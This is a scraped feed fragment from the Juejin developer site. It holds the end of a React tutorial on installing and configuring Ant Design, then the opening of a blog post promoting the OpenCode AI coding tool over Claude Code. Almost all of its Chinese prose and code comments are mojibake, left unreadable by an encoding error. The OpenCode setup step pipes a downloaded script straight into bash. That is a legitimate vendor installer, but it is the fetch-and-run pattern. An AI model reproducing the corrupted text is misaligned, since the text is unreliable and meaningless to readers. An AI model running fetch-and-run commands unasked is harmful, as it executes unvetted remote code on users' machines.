12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">ä¸€ã€å®‰è£…</h2>
<ul>
<li>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fant.design%2Fdocs%2Freact%2Fintroduce-cn" target="_blank" title="https://ant.design/docs/react/introduce-cn" ref="nofollow noopener noreferrer">Ant Design</a></li>
<li>npm</li>
</ul>
<pre><code class="hljs language-css" lang="css">npm install antd <span class="hljs-attr">--save</span>
</code></pre>
<ul>
<li>yarn</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">yarn <span class="hljs-keyword">add</span> antd
</code></pre>
<ul>
<li>pnpm</li>
</ul>
<pre><code class="hljs language-css" lang="css">pnpm install antd <span class="hljs-attr">--save</span>
</code></pre>
<h2 data-id="heading-1">äºŒã€mainå¼•ç”¨</h2>
<ul>
<li>å¼•å…¥Ant Designçš„<code>reset.css</code>æ–‡ä»¶</li>
<li>å¼•å…¥<code>ConfigProvider</code>å…¨å±€é…ç½®ï¼Œä¸”åŒ…å«æ‰€æœ‰ç»„ä»¶</li>
<li>è®¾ç½®<code>locale</code>å±æ€§ä¸º<code>ä¸­æ–‡</code></li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯¼å…¥ä¸¥æ ¼æ¨¡å¼ç»„ä»¶ï¼Œç”¨äºå¼€å‘ç¯å¢ƒä¸‹æ£€æµ‹æ½œåœ¨é—®é¢˜</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">StrictMode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-comment">// å¯¼å…¥å®¢æˆ·ç«¯æ¸²æŸ“æ–¹æ³•ï¼Œç”¨äºåˆ›å»ºæ ¹èŠ‚ç‚¹å¹¶æ¸²æŸ“åº”ç”¨</span>
<span class="hljs-keyword">import</span> { createRoot } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom/client'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.jsx'</span>;
<span class="hljs-comment">// å¯¼å…¥Ant Designçš„æ ·å¼æ–‡ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'antd/dist/reset.css'</span>;
<span class="hljs-comment">// å¯¼å…¥å…¨å±€è‡ªå®šä¹‰æ ·å¼æ–‡ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./index.css'</span>;
<span class="hljs-comment">// å¯¼å…¥Ant Designé…ç½®æä¾›è€…ç»„ä»¶</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;
<span class="hljs-comment">// å¯¼å…¥Ant Designçš„ä¸­æ–‡è¯­è¨€åŒ…</span>
<span class="hljs-keyword">import</span> zhCN <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/locale/zh_CN'</span>;

<span class="hljs-comment">// è·å– HTML ä¸­ id ä¸º 'root' çš„ DOM å…ƒç´ ä½œä¸ºåº”ç”¨æ ¹èŠ‚ç‚¹</span>
<span class="hljs-keyword">const</span> rootElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'root'</span>);

<span class="hljs-comment">// å¦‚æœæ‰¾ä¸åˆ°æ ¹èŠ‚ç‚¹ï¼Œåˆ™æŠ›å‡ºé”™è¯¯</span>
<span class="hljs-keyword">if</span> (!rootElement) {
	<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ‰¾ä¸åˆ°idä¸º"root"çš„DOMå…ƒç´ ï¼Œè¯·æ£€æŸ¥index.htmlæ–‡ä»¶'</span>);
}

<span class="hljs-comment">// åˆ›å»º React æ ¹èŠ‚ç‚¹</span>
<span class="hljs-keyword">const</span> root = <span class="hljs-title function_">createRoot</span>(rootElement);

<span class="hljs-comment">// æ¸²æŸ“æ•´ä¸ª React åº”ç”¨</span>
root.<span class="hljs-title function_">render</span>(
	<span class="hljs-comment">// ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼åŒ…è£…åº”ç”¨</span>
	<span class="hljs-comment">// æ³¨æ„ï¼šä¸¥æ ¼æ¨¡å¼åªåœ¨å¼€å‘ç¯å¢ƒç”Ÿæ•ˆï¼Œç”Ÿäº§ç¯å¢ƒä¼šè‡ªåŠ¨ç¦ç”¨</span>
	<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">StrictMode</span>&gt;</span>
		{/*
		 ConfigProvider æ˜¯ Ant Design çš„å…¨å±€é…ç½®ç»„ä»¶
		 æ­¤å¤„è®¾ç½® locale å±æ€§ä¸ºä¸­æ–‡è¯­è¨€åŒ…ï¼Œå®ç°ç»„ä»¶å›½é™…åŒ–
		 å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ æ›´å¤šå…¨å±€é…ç½®ï¼Œå¦‚ä¸»é¢˜å®šåˆ¶ç­‰
		 */}
		<span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">{zhCN}</span>&gt;</span>
			{/*
			 åº”ç”¨ä¸»ç»„ä»¶
			 æ‰€æœ‰é¡µé¢å’Œè·¯ç”±éƒ½å°†åœ¨ App ç»„ä»¶å†…éƒ¨å®šä¹‰å’Œç®¡ç†
			 */}
			<span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">StrictMode</span>&gt;</span></span>
);

</code></pre>
<h2 data-id="heading-2">ä¸‰ã€ç»„ä»¶å¼•ç”¨</h2>
<ul>
<li>å¼•ç”¨Buttonï¼ŒæŸ¥çœ‹ä½¿ç”¨æ•ˆæœ</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
	<span class="hljs-keyword">return</span> (
		<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
			<span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span>&gt;</span>æŒ‰é’®<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
	);
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¹²æ‰ Claude Codeï¼Œè¿™ä¸ªå¼€æº AI ç¼–ç¨‹å·¥å…·æ€ç–¯äº†ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592876744527249458</link>    <guid>https://juejin.cn/post/7592876744527249458</guid>    <pubDate>2026-01-09T03:30:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592876744527249458" data-draft-id="7592992745573187622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¹²æ‰ Claude Codeï¼Œè¿™ä¸ªå¼€æº AI ç¼–ç¨‹å·¥å…·æ€ç–¯äº†ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-09T03:30:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜é±¼çš®"/> <meta itemprop="url" content="https://juejin.cn/user/2444938365386621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¹²æ‰ Claude Codeï¼Œè¿™ä¸ªå¼€æº AI ç¼–ç¨‹å·¥å…·æ€ç–¯äº†ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2444938365386621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜é±¼çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:30:27.000Z" title="Fri Jan 09 2026 03:30:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ç¨‹åºå‘˜é±¼çš®ã€‚</p>
<p>Claude Code ä¸€ç›´æ˜¯å¤§å®¶å…¬è®¤çš„ AI ç¼–ç¨‹å‘½ä»¤è¡Œå·¥å…· Top 1ï¼Œåœ¨ AI å’Œç¨‹åºå‘˜åœˆå­é‡Œå‡ ä¹æ˜¯ç¥ä¸€èˆ¬çš„å­˜åœ¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ba00eebf1954942b9637ed88faba740~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=zA%2FVo88hf%2FyZ1UOIGtmnJPKkth4%3D" alt="" loading="lazy"/></p>
<p>ä½†æ˜¯ï¼Œè¿™ç‹—ç©æ„å„¿å¯¹ä¸­å›½ç”¨æˆ·å¯ä¸å¤ªå‹å¥½â€¦â€¦</p>
<p>é¦–å…ˆï¼Œå¦‚æœä½ æƒ³è¦ä½¿ç”¨ Claude Codeï¼Œå°±å¿…é¡»è¦æœ‰ç‰¹æ®Šçš„ç½‘ç»œ + å®˜æ–¹è´¦å·ï¼Œå¦åˆ™å°±ä¼šçœ‹åˆ°ä¸€ç‰‡çº¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2b340cc20cb422582e29770942f8a13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=HaHPOCjUuUEKgyVv0wIBhIGAgWI%3D" alt="" loading="lazy"/></p>
<p>æ­¤å¤–ï¼Œ2025 å¹´ 9 æœˆï¼ŒAnthropic å…¬å¸ä¸çŸ¥é“æŠ½ä»€ä¹ˆé£ï¼Œçªç„¶å®£å¸ƒ <strong>å…¨é¢ç¦æ­¢ä¸­å›½æ§è‚¡ä¼ä¸šä½¿ç”¨ Claude æœåŠ¡</strong>ï¼Œä¸ä»…åŒ…æ‹¬ä¸­å›½å¤§é™†ä¼ä¸šï¼Œè¿æµ·å¤–ä¸­èµ„æ§è‚¡è¶…è¿‡ 50% çš„å…¬å¸éƒ½åœ¨å°ç¦èŒƒå›´å†…ï¼</p>
<p>ç”šè‡³ Anthropic è¿˜ç‰¹åˆ«ç‚¹åäº†ä¸­å›½ï¼ŒæŠŠå’±ä»¬ç§°ä¸º <strong>æ•Œå¯¹å›½å®¶</strong>ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37dee3c168d9438491040315fefd3823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=aEYY3Prn42bge421vzXCm7YlHaI%3D" alt="" loading="lazy"/></p>
<p>å¤©ä¸‹è‹¦ Claude Code ä¹…çŸ£ï¼</p>
<p>ä½†æ˜¯æœ€è¿‘æˆ‘èº«è¾¹å¾ˆå¤šç¨‹åºå‘˜æœ‹å‹å¼€å§‹ä» Claude Code è½¬å‘äº†å¦ä¸€ä¸ªå·¥å…·ï¼Œæ­£æ˜¯çªç„¶å¤§ç«çš„å¼€æºé¡¹ç›® OpenCodeã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f86e08f12a7442793216a254fe82f63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=yP3vGUbeHCbATjDYKCZKfiPb28o%3D" alt="" loading="lazy"/></p>
<p>è¿™ç©æ„åªç”¨äº†åŠå¹´çš„æ—¶é—´ï¼Œå°±åœ¨ GitHub ä¸Šæ¶¨åˆ°äº† 5.2w Starï¼</p>
<p>è¿™æ˜¯ä¸ªä»€ä¹ˆæ¦‚å¿µï¼Ÿæ¯”æˆ‘åœ¨ GitHub ä¸Šå¼€æºçš„å‡ åä¸ªé¡¹ç›®çš„æ€»å’ŒåŠ èµ·æ¥éƒ½å¤šï¼æ…•äº†æ…•äº†â€¦â€¦</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47a41d0b261b45888439769d71d4792e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=3g416nW0bghlbIkz0WwoubFlXgk%3D" alt="" loading="lazy"/></p>
<p>OpenCode åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿå‡­ä»€ä¹ˆè¿™ä¹ˆç«ï¼Ÿ</p>
<h2 data-id="heading-0">å•¥æ˜¯ OpenCodeï¼Ÿ</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">OpenCode</a> æ˜¯ä¸€æ¬¾ 100% å¼€æºçš„ AI ç¼–ç¨‹å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥åœ¨ <strong>ç»ˆç«¯ã€IDEã€ç”šè‡³æ¡Œé¢åº”ç”¨</strong> ä¸­ä½¿ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c59cbc53d3de462f8a17815ce3fe9314~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=1OwqTKpSEtcLeVROfmDuI%2Fi9W%2BI%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯èƒ½ä¼šé—®ï¼šè¿™ç©æ„å„¿è·Ÿ Claude Code æœ‰å•¥åŒºåˆ«ï¼Ÿ</p>
<p>è¯•è¯•ä¸å°±çŸ¥é“äº†ï¼Ÿ</p>
<p>æ¥ä¸‹æ¥æˆ‘å¸¦å¤§å®¶å®æ“ä¸€ä¸‹ï¼Œä»é›¶å¼€å§‹å®‰è£…ã€é…ç½®ã€åˆ°å®é™…å†™ä»£ç ï¼Œä¸€æ¡é¾™æœåŠ¡~</p>
<h2 data-id="heading-1">ä» 0 å¼€å§‹ä¸Šæ‰‹ OpenCode</h2>
<h3 data-id="heading-2">1ã€å®‰è£…è¿è¡Œ OpenCode</h3>
<p>ç›´æ¥è¿›å…¥ OpenCode å®˜ç½‘ï¼Œå¤åˆ¶ä¸€è¡Œå‘½ä»¤ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49a937d09fbe494f8e520c85fd02cdf9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=pbMZFJRmeycyuH9ki1WNqpwXGOE%3D" alt="" loading="lazy"/></p>
<p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">curlÂ -fsSLÂ https:<span class="hljs-comment">//opencode.ai/install |Â bash</span>
</code></pre>
<p>ç„¶ååœ¨ç»ˆç«¯ä¸­æ‰§è¡Œï¼Œå°±å¯ä»¥å®Œæˆå®‰è£…äº†ã€‚</p>
<p>å®‰è£…å®Œæˆä¹‹åï¼Œè¾“å…¥ <code>opencode</code> è¿›å…¥ç¨‹åºï¼Œæ¥ä¸‹æ¥ä½ å°±å¯ä»¥æ„‰å¿«åœ°ä½¿ç”¨äº†~</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12123a0bdd734e13b0cd500f20e7796f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=xohzlDJWpbGxvRUqkf23xiCy7Oc%3D" alt="" loading="lazy"/></p>
<p>å…ˆæ¥ä¸ªç»å…¸çš„ Hello Worldï¼ŒAI æˆåŠŸç»™å‡ºäº†å›å¤ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3901f8166e8a48e4ac0f662f65e299e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=3pAFVdk5puKZKjSLRwxEATWIHzs%3D" alt="" loading="lazy"/></p>
<p>æ­å–œï¼Œåˆ°è¿™é‡Œä½ å·²ç»æŒæ¡äº† OpenCode çš„ 70% äº†ã€‚</p>
<h3 data-id="heading-3">2ã€é€‰æ‹©æ¨¡å¼å’Œæ¨¡å‹</h3>
<p>OpenCode æ”¯æŒ 2 ç§æ¨¡å¼ï¼Œé»˜è®¤æ˜¯ Build æ¨¡å¼ï¼Œç”¨æ¥æ„å»ºåº”ç”¨ã€ç”Ÿæˆä»£ç ã€‚</p>
<p>æŒ‰ä¸€ä¸‹ Tab é”®ï¼Œå°±å¯ä»¥åˆ‡æ¢åˆ° Plan æ¨¡å¼ï¼Œç”¨äºç”Ÿæˆæ‰§è¡Œè®¡åˆ’ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4a2cd7a5ef3439ba2e6bc423c7fbd17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=VcK77eTkZqGxR37k39vQ75366qo%3D" alt="" loading="lazy"/></p>
<p>æŒ‰ä¸€ä¸‹ <code>Ctrl + p</code> é”®ï¼Œå¯ä»¥æ‰“å¼€å‘½ä»¤é¢æ¿ï¼Œé‡Œé¢æœ‰å‡ åä¸ªå†…ç½®å‘½ä»¤ã€‚æˆ‘ä»¬å…ˆæ¥è¯•ç€åˆ‡æ¢ä¸€ä¸‹å¤§æ¨¡å‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d47428396ca4b97af1146b5f4dd0cc7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=YKHIr%2FpAdIdlvZbaGz%2BnQmiHhqU%3D" alt="" loading="lazy"/></p>
<p>é»˜è®¤æä¾›äº† 4 ä¸ªå…è´¹æ¨¡å‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee1068d6c3ba464685733273e2d2ca2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=vxuYQgvvTPNHo0gRrPuUYElr9h8%3D" alt="" loading="lazy"/></p>
<p>å¥½å®¶ä¼™ï¼Œè¿æ™ºè°±æœ€æ–°çš„ GLM-4.7 ç«Ÿç„¶ä¹Ÿå…è´¹ï¼Ÿé‚£æˆ‘çš„ Coding Plan å¥—é¤ä¸æ˜¯ç™½å¼€äº†ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/252f1faeef6042399697fd6a3fe4148e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=w63y%2BUH8GOhyUrIEKAhtURfAL2Q%3D" alt="" loading="lazy"/></p>
<p>é™¤äº†å…è´¹çš„æ¨¡å‹å¤–ï¼ŒOpenCode æ”¯æŒè¶…å¤šçš„ AI æ¨¡å‹ï¼Œä½ å¯ä»¥è‡ªç”±é€‰æ‹©ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bcd05d258be4d0a9f60a1e9ee7c4deb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=esbiS6%2FQoPFK3Ep0IVpkxJV3xbk%3D" alt="" loading="lazy"/></p>
<p>é€‰ä¸­æ¨¡å‹åï¼Œé…ç½®è‡ªå·±çš„ API Key å°±å¥½äº†ï¼š</p>
